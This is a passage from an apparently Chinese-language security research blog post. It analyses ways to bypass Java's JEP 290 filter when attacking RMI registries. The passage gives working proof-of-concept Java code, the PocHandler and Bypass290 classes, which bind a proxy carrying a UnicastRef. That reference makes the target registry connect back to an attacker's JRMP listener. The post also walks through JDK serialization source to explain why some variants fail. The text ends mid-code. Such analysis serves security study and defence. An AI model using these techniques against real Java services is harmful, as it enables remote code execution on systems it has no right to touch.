<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PocHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RemoteRef ref;<span class="comment">//来放我们的UnicastRef对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">PocHandler</span><span class="params">(RemoteRef newref)</span> </span>&#123;<span class="comment">//构造方法，来引入UnicastRef</span></span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ref <span class="comment">//只是为了满足拦截类的格式，随便写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">    UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">    Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Remote.class&#125;, <span class="keyword">new</span> PocHandler(unicastRef));</span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">    registry.bind(<span class="string">"2333"</span>, remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>老样子JRMP-listener一开，然后打ServerAndRegister</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17an3i2aj325h175kc6.jpg" alt="绕过JEP-Bypass_proxy.png"></p>
<p>完美，没问题</p>
<blockquote>
<p>同时这里存在一个非常神奇的问题，本以为客户端自定义一个PocHandler拦截器，rmi服务端是不会有这个拦截器的，所以在反序列化的时候会因为没有类而报错。但是实际上远程利用是可以成功的。</p>
<p>从报错中我们也可以看到，服务端确实找不到这个类，但是会触发代码执行，之前bind绑定也说过这个问题，推测由于先反序列化类中的变量，然后恢复成类导致的。</p>
</blockquote>
<h5 id="2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><a href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）" class="headerlink" title="2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"></a>2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</h5><blockquote>
<p>这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑</p>
</blockquote>
<p>假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的——<strong>RemoteObjectInvocationHandler</strong></p>
<ol>
<li>它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
<li>同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObjectInvocationHandler</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">RemoteObject</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">InvocationHandler</span> //表示是一个拦截器</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数，传入一个RemoteRef接口类型的变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RemoteObjectInvocationHandler</span><span class="params">(RemoteRef ref)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ref);</span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//而UnicastRef类型实现RemoteRef接口，即可以传入</span></span><br><span class="line"><span class="comment">//public class UnicastRef implements RemoteRef &#123;</span></span><br></pre></td></tr></table></figure>
<p><code>super(ref);</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The object's remote reference. */</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">protected</span> RemoteRef ref;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">//super(ref)的内容，可以成功塞入变量中</span></span><br><span class="line">     <span class="function"><span class="keyword">protected</span> <span class="title">RemoteObject</span><span class="params">(RemoteRef newref)</span> </span>&#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然而这里会有一个神奇的问题，我们知道<code>transient</code>修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？</p>
<p>但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。</p>
<p><code>java.rmi.server.RemoteObject#writeObject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">"Invalid remote object"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String refClassName = ref.getRefClass(out);</span><br><span class="line">            <span class="keyword">if</span> (refClassName == <span class="keyword">null</span> || refClassName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="comment">//不会进入的地方....</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Built-in reference class specified, so delegate</span></span><br><span class="line"><span class="comment">                 * to reference to write out its external form.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                 <span class="comment">//我们的序列化操作会进入到这里对于ref进行序列化</span></span><br><span class="line">                out.writeUTF(refClassName);</span><br><span class="line">                ref.writeExternal(out);</span><br><span class="line">                <span class="comment">//在这里通过writeExternal来写入了ref</span></span><br><span class="line">                <span class="comment">//（transient类型的变量可以通过writeExternal来写入序列化）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。</p>
<p>那么在确定<strong>RemoteObjectInvocationHandler</strong>可以填入一个<strong>UnicastRef对象</strong>并且不影响序列化之后。接下来就是利用动态代理进行类型转变</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bypass290</span> </span>&#123;</span><br><span class="line">    <span class="comment">//省略generateUnicastRef方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获取UnicastRef对象</span></span><br><span class="line">        String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;<span class="comment">//本地测试</span></span><br><span class="line">        <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        <span class="comment">//通过构造函数封装进入RemoteObjectInvocationHandler</span></span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        <span class="comment">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span></span><br><span class="line">        <span class="comment">//所以接下来bind可以填入proxy</span></span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span><br><span class="line">                                                           <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, proxy);<span class="comment">//填入payload</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17askso1j320p12in1p.jpg" alt="绕过JEP-Bypass290-RemoteObjectInvocationHandler.png"></p>
<h5 id="3-找一个带UnicastRef类型参数的实现Remote接口的类"><a href="#3-找一个带UnicastRef类型参数的实现Remote接口的类" class="headerlink" title="3.找一个带UnicastRef类型参数的实现Remote接口的类"></a>3.找一个带UnicastRef类型参数的实现Remote接口的类</h5><p>那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。</p>
<ol>
<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
<li>这个类要是Remote接口的</li>
</ol>
<h6 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h6><p>其实<strong>RemoteObjectInvocationHandler</strong>本身就是一个实现了Remote接口的类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteObjectInvocationHandler定义，继承自RemoteObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObjectInvocationHandler</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">RemoteObject</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">//<span class="title">RemoteObject</span>定义，实现了<span class="title">Remote</span>接口</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">abstract</span> <span class="title">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>所以上面<strong>ysoserial-payload-JRMPClient</strong>中利用动态代理修改RemoteObjectInvocationHandler接口是多余的。</p>
<p>直接注释了动态代理操作也可以打。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//获取UnicastRef对象</span></span><br><span class="line">    String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;<span class="comment">//本地测试</span></span><br><span class="line">    <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">    UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">    <span class="comment">//通过构造函数封装进入RemoteObjectInvocationHandler</span></span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">    <span class="comment">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span></span><br><span class="line">    <span class="comment">//所以接下来bind可以填入proxy 注释</span></span><br><span class="line">    <span class="comment">//        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span></span><br><span class="line">    <span class="comment">//                new Class[]&#123;Registry.class&#125;, obj);</span></span><br><span class="line">    <span class="comment">//触发漏洞</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">    <span class="comment">//        registry.bind("hello", proxy);//填入payload</span></span><br><span class="line">    registry.bind(<span class="string">"hello"</span>, obj);<span class="comment">//填入payload</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b0fw5qj323u11igzp.jpg" alt="绕过JEP-bYPASS290-RemoteObject-参数.png"></p>
<p>可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。</p>
<ol>
<li>而UnicastRef对象是在RemoteObject类中赋值的</li>
<li>RemoteObject类又是一个Remote接口</li>
</ol>
<p>那么理论上来说所有RemoteObject的子类都是可以的，我们可以通过ctrl+alt+B来查看子类。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b654atj31i00l30wb.jpg" alt="绕过JEP-remote参数更多查看方式.png"></p>
<p>我们选取<strong>RMIConnectionImpl_Stub</strong>和<strong>UnicastRemoteObject</strong>来举例说明</p>
<h6 id="RMIConnectionImpl-Stub"><a href="#RMIConnectionImpl-Stub" class="headerlink" title="RMIConnectionImpl_Stub"></a>RMIConnectionImpl_Stub</h6><p>RMIConnectionImpl_Stub是可以利用的。</p>
<p>是Remote接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIConnectionImpl_Stub类定义，继承自RemoteStub类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIConnectionImpl_Stub</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">RemoteStub</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">management</span>.<span class="title">remote</span>.<span class="title">rmi</span>.<span class="title">RMIConnection</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteStub 定义，继承自RemoteObject类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteStub</span> <span class="keyword">extends</span> <span class="title">RemoteObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RemoteObject定义，实现Remote接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>利用构造方法可以容纳一个UnicastRef对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RMIConnectionImpl_Stub</span><span class="params">(java.rmi.server.RemoteRef ref)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="title">RemoteStub</span><span class="params">(RemoteRef ref)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">RemoteObject</span><span class="params">(RemoteRef newref)</span> </span>&#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了，放个图表示可以：</p>
<blockquote>
<p>详细代码参考github Bypass290.java</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17bgrq6oj324a17marh.jpg" alt="绕过JEP-remote参数-RMIConnectionImpl_Stub.png"></p>
<h6 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h6><p>UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。</p>
<p>它的确是Remote接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.rmi.server.UnicastRemoteObject定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">extends</span> <span class="title">RemoteServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteServer定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteServer</span> <span class="keyword">extends</span> <span class="title">RemoteObject</span>//这个就是了 不赘述</span></span><br><span class="line"><span class="class"></span>&#123;</span><br></pre></td></tr></table></figure>
<p>同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。</p>
<p>我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.UnicastRemoteObject</span></span><br><span class="line"><span class="comment">//3.1.获取到UnicastRemoteObject的实例</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();</span><br><span class="line"><span class="comment">//3.2.修改实例的ref参数（使用yso中的模块）</span></span><br><span class="line">Reflections.setFieldValue(UnicastRemoteObject_obj,<span class="string">"ref"</span>,ref);</span><br></pre></td></tr></table></figure>
<p>可以对比下三个对象的内容，都包含了我们修改的ref对象，没问题。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17br86p2j31mg15jqbm.jpg" alt="绕过JEP-remote参数-三者对比.png"></p>
<p>但是在实际利用的时候，<strong>使用UnicastRemoteObject是不可以的！</strong>一开始我也非常的疑惑：这不科学！，但是代码是死肥宅最忠实的伙伴，它是不会骗人的。</p>
<blockquote>
<p><a href="http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/" target="_blank" rel="noopener">bsmali4师傅的一次攻击内网RMI服务的深思</a>这篇文章中发现了这个问题，但是他的结论是由于ref是一个transient类型的变量，不会反序列化。</p>
<p>但实际上可以攻击的RMIConnectionImpl_Stub类也是使用transient类型的ref。所以这个结论是错误的</p>
</blockquote>
<p>其实关键点在于：</p>
<ul>
<li>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，<code>RMIConnectionImpl_Stub.writeobject()</code>、<code>UnicastRemoteObject.writeobject()</code>那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</li>
<li>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</li>
</ul>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17d62azlj31500s80vo.jpg" alt="绕过JEP-remote参数-回顾实际序列化过程.png"></p>
<p>那么实际上这边的序列化逻辑与我们想象的有点出入，<strong>他会去替换掉我们辛辛苦苦生成的object</strong>。这是导致同是继承RemoteObject有的行，有的不行的关键。</p>
<p>我们在<code>java.io.ObjectOutputStream#writeObject0</code>打入断点，使用UnicastRemoteObject对象来攻击，细看：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">     depth++;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//一大堆类型检查，都不会通过</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// 想要去检查替换我们的object</span></span><br><span class="line">         Object orig = obj;</span><br><span class="line">         Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">         ObjectStreamClass desc;</span><br><span class="line">         <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">             <span class="comment">//查找相关内容</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (enableReplace) &#123;<span class="comment">//都是true</span></span><br><span class="line">         <span class="comment">//!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span></span><br><span class="line">             Object rep = replaceObject(obj);</span><br><span class="line">             <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                 cl = rep.getClass();</span><br><span class="line">                 desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             obj = rep;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一些替换后的处理，不太重要</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// 通过类进行分配序列化过程</span></span><br><span class="line">         <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">             writeString((String) obj, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">             writeArray(obj, desc, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">             writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">         	<span class="comment">//进入此处再开始正常的序列化</span></span><br><span class="line">             writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">         <span class="comment">//...省略...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>UnicastRemoteObject在此处的情况，发生了变化：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dcc242j31mq0vwaen.jpg" alt="绕过JEP-remote参数-UnicastRemoteObject替换.png"></p>
<p>RMIConnectionImpl_Stub在此处的情况，没有发生变化：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17dhs3z2j31fr0vtn14.jpg" alt="绕过JEP-remote参数-RMIConnectionImpl_Stub替换.png"></p>
<p>repalceobject替换的方法具体在<code>sun.rmi.server.MarshalOutputStream#replaceObject</code>中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1就是我们想要序列化的类</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title">replaceObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span></span><br><span class="line">    <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote &amp;&amp; !(var1 <span class="keyword">instanceof</span> RemoteStub)) &#123;</span><br><span class="line">        <span class="comment">//这里会去获取到新的对象来替换</span></span><br><span class="line">        <span class="comment">//UnicastRemoteObject走的就是这条路</span></span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> var2.getStub();</span><br><span 